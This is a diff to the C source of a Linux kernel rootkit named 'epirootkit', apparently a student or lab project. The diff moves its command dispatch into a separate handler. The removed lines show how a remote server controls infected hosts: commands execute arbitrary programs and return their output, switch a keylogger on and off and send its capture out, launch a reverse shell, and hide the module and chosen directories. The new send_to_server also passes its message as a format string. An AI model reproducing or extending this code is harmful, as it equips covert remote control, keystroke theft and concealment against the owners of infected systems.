@@ -40,19 +40,25 @@ int close_socket(void)
  *         failure of the operation. Specific return codes and
  *         their meanings should be documented in the implementation.
  */
-int send_to_server(char *message)
-{
+int send_to_server(char *message, ...){
 	struct kvec vec = { 0 };
 	struct msghdr msg = { 0 };
 	int ret_code = 0;
+	va_list args;
+	char formatted_message[1024] = { 0 };
 
 	if (!sock) {
 		ERR_MSG("send_to_server: socket is NULL\n");
 		return -FAILURE;
 	}
 
-	vec.iov_base = message;
-	vec.iov_len = strlen(message);
+	// Format the message with additional arguments
+	va_start(args, message);
+	vsnprintf(formatted_message, sizeof(formatted_message), message, args);
+	va_end(args);
+
+	vec.iov_base = formatted_message;
+	vec.iov_len = strlen(formatted_message);
 
 	ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
 	if (ret_code < 0) {
@@ -135,7 +141,7 @@ int network_worker(void *data)
 	unsigned empty_count = 0;
 	// Listen for commands
 	// Retry until 'killcom' is received or thread is stopped by unmonting the module
-	while (!kthread_should_stop()) {
+	while (!kthread_should_stop() && !thread_exited) {
 		struct kvec recv_vec;
 		struct msghdr recv_msg = { 0 };
 		char recv_buffer[RCV_CMD_BUFFER_SIZE] = { 0 };
@@ -167,65 +173,7 @@ int network_worker(void *data)
 			empty_count = 0; // Reset the empty message count
 		}
 
-		// Parse and handle the received command
-		if (strncmp(recv_buffer, "exec ", 5) == 0) {
-			// Extract the command from the received message
-			char *command = recv_buffer + 5;
-			command[strcspn(command, "\n")] = '\0';
-			DBG_MSG("network_worker: executing command: %s\n", command);
-			exec_str_as_command(command);
-
-			// Send the result back to the server
-			char result_msg[2*(STD_BUFFER_SIZE)];
-			snprintf(result_msg, 
-						sizeof(result_msg), 
-						"execution result:\nstdout:\n%s\nstderr:\n%s\nterminated with code %d\n", 
-						exec_result.std_out, exec_result.std_err, exec_result.code);
-			ret_code = send_to_server(result_msg);
-			if (ret_code != SUCCESS) {
-				ERR_MSG("network_worker: failed to send result message\n");
-			}
-			DBG_MSG("network_worker: command result sent\n");
-		} else if (strncmp(recv_buffer, "klgon ", 5) == 0) {
-			epikeylog_init(0);
-			send_to_server("keylogger activated\n");
-			DBG_MSG("network_worker: keylogger activated\n");
-		} else if (strncmp(recv_buffer, "klgoff", 6) == 0) {
-			epikeylog_exit();
-			send_to_server("keylogger deactivated\n");
-			DBG_MSG("network_worker: keylogger deactivated\n");
-		} else if (strncmp(recv_buffer, "klg", 3) == 0) {
-			epikeylog_send_to_server();
-			DBG_MSG("epirootkit: network_worker: keylogger content sent\n");
-		} else if (strncmp(recv_buffer, "shellon", 7) == 0) {
-			DBG_MSG("epirootkit: network_worker: shellon received, launching reverse shell\n");
-			launch_reverse_shell();		
-		} else if (strncmp(recv_buffer, "killcom", 7) == 0) {
-			DBG_MSG("network_worker: killcom received, exiting...\n");
-			break;
-		} else if (strncmp(recv_buffer, "hide_module", 11) == 0) {
-			DBG_MSG("epirootkit: network_worker: hiding module\n");
-			hide_module();
-		} else if (strncmp(recv_buffer, "unhide_module", 13) == 0) {
-			DBG_MSG("epirootkit: network_worker: unhiding module\n");
-			unhide_module();
-		} else if (strncmp(recv_buffer, "hide_dir",8) == 0) {
-			char *command = recv_buffer + 9;
-			command[strcspn(command, "\n")] = '\0';
-			if (add_hidden_dir(command) < 0) {
-				ERR_MSG("epirootkit: network_worker: failed to hide directory\n");
-			} else {
-				DBG_MSG("epirootkit: network_worker: directory %s hidden\n", recv_buffer + 9);
-			}
-		} else if (strncmp(recv_buffer, "show_dir", 8) == 0) {
-			char *command = recv_buffer + 9;
-			command[strcspn(command, "\n")] = '\0';
-			if (remove_hidden_dir(command) < 0) {
-				ERR_MSG("epirootkit: network_worker: failed to unhide directory\n");
-			} else {
-				DBG_MSG("epirootkit: network_worker: directory %s unhidden\n", recv_buffer + 9);
-			}
-		} 
+		rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE);
 	}
 
 	// Final cleanup before thread exits
